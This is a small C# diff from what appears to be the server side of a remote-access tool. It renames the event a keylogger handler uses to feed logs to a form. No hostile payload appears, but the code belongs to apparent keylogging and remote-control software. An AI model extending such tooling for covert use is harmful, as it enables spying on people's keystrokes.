@@ -71,7 +71,7 @@ namespace Rouzzf.Server.Forms
         private void RegisterMessageHandler()
         {
             _connectClient.ClientState += ClientDisconnected;
-            _keyloggerHandler.ProgressChanged += LogsChanged;
+            _keyloggerHandler.report += LogsChanged;
             MessageHandler.Register(_keyloggerHandler);
         }
 
@@ -81,7 +81,7 @@ namespace Rouzzf.Server.Forms
         private void UnregisterMessageHandler()
         {
             MessageHandler.Unregister(_keyloggerHandler);
-            _keyloggerHandler.ProgressChanged -= LogsChanged;
+            _keyloggerHandler.report -= LogsChanged;
             _connectClient.ClientState -= ClientDisconnected;
         }
 
